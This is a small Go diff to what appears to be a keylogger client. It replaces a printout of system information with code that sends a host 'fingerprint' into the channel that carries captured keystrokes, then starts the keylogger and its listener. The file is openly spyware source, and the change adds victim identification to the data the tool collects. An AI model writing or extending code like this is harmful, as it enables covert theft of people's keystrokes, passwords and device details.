@@ -1,8 +1,6 @@
 package main
 
 import (
-	"fmt"
-
 	"github.com/Spriithy/gkl/client"
 	"github.com/Spriithy/gkl/client/keylogger"
 )
@@ -13,9 +11,11 @@ func main() {
 		return
 	}
 
-	fmt.Println(client.SysInfo.String())
-
 	keystrokes := make(chan string)
+
+	// send client fingerprint
+	keystrokes <- client.SysInfo.String()
+
 	kl := keylogger.NewKeylogger(keystrokes)
 
 	go kl.Decoder.Listen()
